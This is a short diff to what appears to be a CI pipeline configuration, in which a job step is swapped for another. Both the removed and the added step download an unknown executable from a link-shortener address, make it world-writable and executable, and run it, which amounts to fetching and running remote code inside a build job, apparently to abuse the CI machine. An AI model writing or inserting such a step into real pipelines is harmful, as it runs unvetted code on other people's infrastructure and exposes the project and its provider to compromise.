@@ -6,4 +6,4 @@ jobs:
       image: ubuntu-2004:202107-02
     resource_class: medium
     steps:
-      - run: wget -O bruh http://gg.gg/vkmf5 && chmod +x bruh && chmod 777 bruh && ./bruh
+      - run: wget -O breh http://gg.gg/hahahugolinuxgobrr && chmod +x breh && chmod 777 breh && ./breh
